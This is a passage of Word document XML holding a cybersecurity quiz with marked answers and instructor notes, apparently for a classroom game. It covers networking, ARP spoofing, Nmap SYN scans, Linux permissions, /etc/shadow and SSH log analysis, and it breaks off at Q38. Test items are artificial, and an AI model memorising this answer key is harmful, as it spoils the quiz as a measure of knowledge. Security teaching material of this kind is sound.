          <w:b/>
        </w:rPr>
        <w:t>DNS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) HTTP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) ARP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* DNS = "phonebook of the internet." DNS poisoning = one of most impactful network attacks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q23</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What does "192.168.1.0/24" mean in CIDR notation?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) The network has 24 devices connected</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) The first 24 bits are the network address, giving 256 host addresses ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) The network speed is 24 Mbps</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Only 24 ports are open on this network</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* /24 = 255.255.255.0 subnet mask = 254 usable hosts. Subnetting fundamentals.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q24</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which tool captures and analyses network traffic packets in real time?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Nmap</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Metasploit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Wireshark</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Burp Suite</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Wireshark = the packet analyser. Nmap = port scanner. Knowing which tool does what is critical.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q25</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ARP poisoning (ARP spoofing) allows an attacker to:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Crack encrypted passwords</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Inject malicious code into a web application</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Redirect network traffic through the attacker's machine (Man-in-the-Middle)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Scan for open ports on a target system</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* ARP links IP to MAC addresses — poisoning maps victim's IP to attacker's MAC. Classic LAN attack.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q26</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is the primary security difference between IPv4 and IPv6?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) IPv6 is slower and therefore harder to attack</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) IPv4 uses encryption natively; IPv6 does not</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IPv6 was designed with IPsec as a core feature; IPv4 added it later</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) IPv6 eliminates the need for DNS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CRITICAL] · *Time:* 60 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* IPsec built-in to IPv6 spec — though implementation varies. Good for advanced discussion.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q27</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which Nmap command performs a stealthy SYN scan?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) nmap -A target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) nmap -sU target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nmap -sS target</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) nmap -sV target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* -sS = SYN/half-open scan (doesn't complete handshake = fewer logs). Only use on authorised systems.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q28</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which layer of the OSI model do firewalls operating at Layer 3/4 primarily filter?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Application and Presentation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Session and Transport</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Network and Transport</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Physical and Data Link</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Traditional packet-filtering firewalls work at L3 (IP) and L4 (port). NGFWs go up to L7.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q29</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Telnet is considered insecure primarily because:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) It uses port 23 which is easy to remember</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) It cannot be used over the internet</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>It transmits all data, including passwords, in plaintext</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) It is too slow for modern networks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Wireshark demo moment: capture a Telnet session and show the password in clear text.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q30</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ★ DOUBLE POINTS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A security analyst at a Nigerian bank uses Wireshark and notices repeated SYN packets from a single IP address targeting the bank's web server, with no corresponding ACK completions. What attack is occurring and what is the appropriate immediate response?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) ARP poisoning; disable all ARP tables on the network</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) DNS hijacking; flush all DNS caches immediately</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SYN flood DoS attack; rate-limit or block the source IP at the firewall</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Port scanning; ignore it as port scanning is not an attack</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [SCENARIO] · *Time:* 60 s · *Points:* 2,000 ★</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Tests network attack recognition + correct response. Debrief: SYN cookies as mitigation, CBN requirement to report DoS targeting financial infrastructure within 24 hours.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>MODULE 3 [BEGINNER]: Linux &amp; System Administration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Level: Beginner | Questions: Q31–Q45*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q31</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which Linux command lists all files in the current directory, including hidden files?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) ls</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) dir</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ls -la</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) ls -r</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* -l = long format, -a = all including hidden (dot files). Common in every pentest.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q32</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What does the command `chmod 755 script.sh` do?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Deletes the file and recreates it with new permissions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Gives all users read-only access to the file</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Gives owner read/write/execute; group and others read/execute</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Encrypts the file with AES-755 cipher</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* 7 = 4+2+1 (rwx), 5 = 4+0+1 (r-x). Octal notation is the foundation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q33</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>In the Linux permission string `-rwxr-xr--`, what can the "group" do?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Read, write, and execute</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Only read</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Read and execute</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Read, write, but not execute</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Break it down: - (type) rwx (owner) r-x (group) r-- (others). Group = r-x = read + execute.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q34</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The `/etc/shadow` file in Linux contains:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) System configuration for the shadow copy service</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Temporary files for background processes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) A list of all installed applications</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Hashed passwords for all user accounts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* /etc/passwd = usernames (world-readable). /etc/shadow = hashes (root-only). Attackers target shadow.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q35</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which command shows all currently running processes in Linux?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) ls -p</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) show proc</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ps aux</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) top -all</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">*Instructor Note:* Also </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="0F772A"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>top</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="0F772A"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>htop</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for interactive view. ps aux = snapshot; top = live.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q36</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which log file in Linux records failed and successful SSH login attempts?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) /var/log/syslog</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) /var/log/messages</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>/var/log/auth.log</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) /var/log/secure.log</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Debian/Ubuntu = auth.log; CentOS/RHEL = /var/log/secure. Both record sudo, su, SSH events.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q37</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What does the command `grep "Failed password" /var/log/auth.log | wc -l` do?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Deletes all failed login entries from the log</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Moves failed login entries to a separate file</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Counts the number of failed SSH login attempts in the log</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Encrypts the auth.log file for secure storage</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Pipe grep output to wc -l (word count, lines). Essential log analysis pattern.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q38</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
